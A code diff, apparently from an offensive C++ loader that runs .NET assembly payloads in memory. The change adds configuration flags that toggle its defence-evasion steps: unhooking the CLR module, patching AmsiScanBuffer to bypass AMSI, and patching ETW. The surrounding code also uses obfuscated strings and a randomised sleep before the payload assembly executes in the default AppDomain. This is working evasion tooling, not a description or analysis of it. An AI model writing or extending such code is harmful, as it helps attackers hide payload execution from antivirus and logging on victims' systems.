@@ -86,7 +86,8 @@ static void unhook_clr_module() {
 }
 
 bool execute_assembly(unsigned char* payload, size_t payload_size,
-                      const char** args, int argc) {
+                      const char** args, int argc,
+                      const LoaderConfig* config) {
 
     ICLRMetaHost* pMetaHost = nullptr;
     HRESULT hr = g_apis.pCLRCreateInstance(CLSID_CLRMetaHost_local, IID_ICLRMetaHost_local,
@@ -121,11 +122,18 @@ bool execute_assembly(unsigned char* payload, size_t payload_size,
 
     Sleep(200 + (GetTickCount() % 800));
 
-    unhook_clr_module();
+    if (!config->no_unhook) {
+        unhook_clr_module();
+    }
 
-    resolve_phase5_amsi();
-    if (g_apis.pAmsiScanBuffer) patch_amsi_bypass();
-    patch_etw_bypass();
+    if (!config->no_amsi) {
+        resolve_phase5_amsi();
+        if (g_apis.pAmsiScanBuffer) patch_amsi_bypass();
+    }
+
+    if (!config->no_etw) {
+        patch_etw_bypass();
+    }
 
     char mmfName[64] = {};
     auto mmfFmt = OBFSTR("Local\\SM0-%lu-%lu");
@@ -220,8 +228,8 @@ bool execute_assembly(unsigned char* payload, size_t payload_size,
     hr = pCLRHost->ExecuteInDefaultAppDomain(loaderPath,
         typeName.c_str(), methodName.c_str(), wArgBuf, &retVal);
 
-    restore_amsi_bypass();
-    restore_etw_bypass();
+    if (!config->no_amsi) restore_amsi_bypass();
+    if (!config->no_etw) restore_etw_bypass();
 
     pCLRHost->Stop();
     pCLRHost->Release();
